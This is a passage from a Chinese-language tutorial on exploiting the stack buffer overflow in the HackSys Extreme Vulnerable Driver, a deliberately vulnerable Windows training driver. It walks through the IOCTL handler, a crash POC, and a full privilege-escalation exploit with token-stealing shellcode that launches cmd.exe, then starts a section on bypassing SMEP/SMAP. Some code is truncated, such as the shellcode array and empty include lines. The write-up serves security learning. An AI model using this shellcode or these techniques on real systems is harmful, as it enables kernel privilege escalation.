    #endif
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            Status = GetExceptionCode();
            DbgPrint("[-] Exception Code: 0x%X\n", Status);
        }
        return Status;
    }
    /// 
    /// Buffer Overflow Stack Ioctl Handler
    /// 
    /// The pointer to IRP
    /// The pointer to IO_STACK_LOCATION structure
    /// NTSTATUS
    NTSTATUS BufferOverflowStackIoctlHandler(
        _In_ PIRP Irp,
        _In_ PIO_STACK_LOCATION IrpSp
    )
    {
        SIZE_T Size = 0;
        PVOID UserBuffer = NULL;
        NTSTATUS Status = STATUS_UNSUCCESSFUL;
        UNREFERENCED_PARAMETER(Irp);
        PAGED_CODE();
        UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
        Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
        if (UserBuffer)
        {
            Status = TriggerBufferOverflowStack(UserBuffer, Size);
        }
        return Status;
    }
漏洞位于`RtlCopyMemory((PVOID)KernelBuffer, UserBuffer,
Size);`一句，其在复制时使用`UserBuffer`长度，且未进行校验，如此一来，若`UserBuffer`长度超过`KernelBuffer`长度，可造成溢出。`KernelBuffer`长度在初始化时为0x800：
下面为触发漏洞POC：
    #include 
    #include 
    #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
    int main()
    {
        HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,NULL,NULL);
        if (dev == INVALID_HANDLE_VALUE) 
        {
            printf("Failed!\n");
            system("pause");
            return -1;
        }
        printf("Done! Device Handle:0x%p\n",dev);
        CHAR* chBuffer;
        int chBufferLen = 0x824;
        chBuffer = (CHAR*)malloc(chBufferLen);
        ZeroMemory(chBuffer, chBufferLen);
        memset(chBuffer, 0x41, chBufferLen);
        DWORD size_returned = 0;
        BOOL is_ok = DeviceIoControl(dev, HEVD_IOCTL_BUFFER_OVERFLOW_STACK,chBuffer,chBufferLen,NULL,0,&size_returned,NULL);
        CloseHandle(dev);
        system("pause");
        return 0;
    }
`int chBufferLen = 0x824;`正好可以覆盖到函数返回地址：
完成覆盖，BSOD：
上述POC仅仅是引发崩溃，下面编写Exp以执行Shellcode。Shellcode如下：
    CHAR shellcode[] =
            "\x60"                            //pushad
            "\x31\xc0"                        //xor eax, eax
            "\x64\x8b\x80\x24\x01\x00\x00"    //mov eax,[fs:eax + 0x124]
            "\x8b\x40\x50"                    //mov eax,[eax + 0x50]
            "\x89\xc1"                        //mov ecx,eax
            "\xba\x04\x00\x00\x00"            //mov edx,0x4
            "\x8b\x80\xb8\x00\x00\x00"        //mov eax,[eax + 0xb8]
    #include 
    #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
    int main()
    {
        HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,NULL,NULL);
        if (dev == INVALID_HANDLE_VALUE) 
        {
            printf("Failed!\n");
            system("pause");
            return -1;
        }
        printf("Done! Device Handle:0x%p\n",dev);
        CHAR* chBuffer;
        int chBufferLen = 0x824;
        chBuffer = (CHAR*)malloc(chBufferLen);
        ZeroMemory(chBuffer, chBufferLen);
        memset(chBuffer, 0x41, chBufferLen-4);
        CHAR* p =(CHAR*)VirtualAlloc(0, 0x60, 0x3000, 0x40);
        ZeroMemory(p, 0x60);
        __asm {
            pushad;
            mov edi, p;
            mov [edi], 0x60;
            mov dword ptr [edi + 0x1], 0x8B64C031;
            mov dword ptr [edi + 0x5], 0x00012480;
            mov dword ptr [edi + 0x9], 0x50408B00;
            mov dword ptr [edi + 0xD], 0x04BAC189;
            mov dword ptr [edi + 0x11], 0x8B000000;
            mov dword ptr [edi + 0x15], 0x0000B880;
            mov dword ptr [edi + 0x19], 0x00B82D00;
            mov dword ptr [edi + 0x1D], 0x90390000;
            mov dword ptr [edi + 0x21], 0x000000B4;
            mov dword ptr [edi + 0x25], 0x908BED75;
            mov dword ptr [edi + 0x29], 0x000000F8;
            mov dword ptr [edi + 0x2D], 0x00F89189;
            mov dword ptr [edi + 0x31], 0x31610000;
            mov dword ptr [edi + 0x35], 0x08C25DC0;
            mov eax, chBuffer;
            mov[eax + 0x820], edi;
            popad;
        }
        DWORD size_returned = 0;
        BOOL is_ok = DeviceIoControl(dev,HEVD_IOCTL_BUFFER_OVERFLOW_STACK,chBuffer,chBufferLen,NULL,0,&size_returned,NULL);
        CloseHandle(dev);
        system("cmd.exe");
        system("pause");
        return 0;
    }
成功：
## 0x03 Bypass SMEP & SMAP
SMEP(Supervisor Mode Execution Prevention)由Intel lvy Bridge引入，从Windows
8开始启用该特性，其作用在于禁止RING-0执行用户空间代码，而SMAP(Supervisor Mode Access Prevention)由Intel
Broadwell引入，相较SMEP增加读与写保护：
设置SMEP与SMAP位于CR4寄存器中：
本节内容笔者于Windows 10 1709 x64环境中调试完成(Exp并未执行成功，但笔者从中学到如何获取内核基址以及绕过SMEP)，内核版本如下：
> Windows 10 Kernel Version 16299 MP (1 procs) Free x64  
>  Built by: 16299.637.amd64fre.rs3_release_svc.180808-1748
查看CR4寄存器内容：
可以看到已启用SMEP。完整Exploit如下(来自[h0mbre's Github](https://github.com/h0mbre/Windows-Exploits/blob/master/Exploit-Code/HEVD/x64_StackOverflow_SMEP_Bypass.cpp))：
    #include 
    #include 
    #include 